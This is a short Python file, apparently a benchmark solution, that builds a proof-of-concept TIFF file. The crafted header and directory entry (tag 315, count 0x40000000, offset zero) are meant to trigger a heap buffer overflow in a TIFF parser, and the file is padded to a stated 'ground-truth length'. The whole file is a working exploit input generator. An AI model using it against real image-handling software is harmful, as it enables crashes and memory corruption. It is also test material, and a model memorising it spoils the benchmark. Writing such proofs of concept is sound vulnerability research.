import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a TIFF file that triggers the heap buffer overflow via an
        # offline tag with offset zero and a large count.
        poc = bytearray()
        # TIFF header: little-endian, version 42, first IFD at offset 8
        poc.extend(b'II\x2a\x00\x08\x00\x00\x00')
        # IFD: one entry
        poc.extend(b'\x01\x00')
        # Directory entry: tag 315 (Artist), type ASCII (2), count 0x40000000, offset 0
        poc.extend(struct.pack('<HHII', 315, 2, 0x40000000, 0))
        # Next IFD offset (0 = end)
        poc.extend(b'\x00\x00\x00\x00')
        # Pad to exact ground‑truth length
        poc.extend(b'\x00' * (162 - len(poc)))
        return bytes(poc)